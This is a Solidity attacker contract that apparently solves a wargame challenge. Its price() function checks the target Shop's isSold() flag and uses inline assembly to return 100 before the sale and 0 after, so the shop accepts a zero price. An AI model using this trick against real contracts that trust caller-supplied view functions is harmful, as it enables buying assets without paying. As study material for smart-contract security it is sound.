// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./Shop.sol";

contract Buyer {
    Shop shop;
    address public owner;

    constructor(address _shop) public {
        shop = Shop(_shop);
        owner = msg.sender;
    }

    function price() external view returns (uint256) {
        bool isSold = Shop(msg.sender).isSold();

        assembly {
            let result
            switch isSold
            case 1 {
                result := 0
            }
            default {
                result := 100
            }
            mstore(0x0, result)
            return(0x0, 32)
        }
    }

    function buy() public {
        shop.buy();
    }
}
